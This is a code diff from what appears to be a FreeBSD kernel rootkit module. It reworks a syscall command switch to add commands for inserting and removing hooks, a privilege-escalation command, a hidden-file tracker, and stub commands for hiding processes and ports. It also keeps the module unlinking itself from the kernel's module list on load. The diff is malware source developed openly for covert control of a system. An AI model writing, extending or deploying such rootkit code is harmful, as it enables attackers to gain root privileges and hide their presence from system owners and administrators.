@@ -22,31 +22,36 @@ static int main(struct thread *td, void *syscall_args) {
 	switch(uap->command){
 		case 0:// Unload
 			break;
-		case 1:// Escalate
-			uprintf("DOING\n");
+		case 1:// Insert Hooks
+			insert_hooks();
+			break;
+		case 2:// Remove Hooks
+			remove_hooks();
+			break;
+		case 3:// Escalate
 			elevate(td);
 			break;
-		case 2:// Add file to tracker
+		case 4:// Add file to tracker
 			add_file(uap->args[0]);
 			break;
-		case 3:// Remove file from tracker
+		case 5:// Remove file from tracker
 			remove_file(uap->args[0]);
 			break;
-		case 4:// Set tracker flags
+		case 6:// Set tracker flags
 			resp = strtol(uap->args[1], NULL, 16);
 			set_flag_bits(uap->args[0], (uint8_t)resp);
 			break;
-		case 5:// Unset tracker flags
+		case 7:// Unset tracker flags
 			resp = strtol(uap->args[1], NULL, 16);
 			unset_flag_bits(uap->args[0], (uint8_t)resp);
 			break;
-		case 6://Hide process
+		case 8://Hide process
 			break;
-		case 7://Unhide process
+		case 9://Unhide process
 			break;
-		case 8://Hide port
+		case 10://Hide port
 			break;
-		case 9://Unhide port
+		case 11://Unhide port
 			break;
 		default:
 			break;
@@ -67,8 +72,6 @@ static int load(struct module *module, int cmd, void *arg) {
 
 	switch (cmd) {
 		case MOD_LOAD:
-			insert_hooks();
-
 			mod_unlink(module, cmd, arg);
 
 			int testfd = 0;
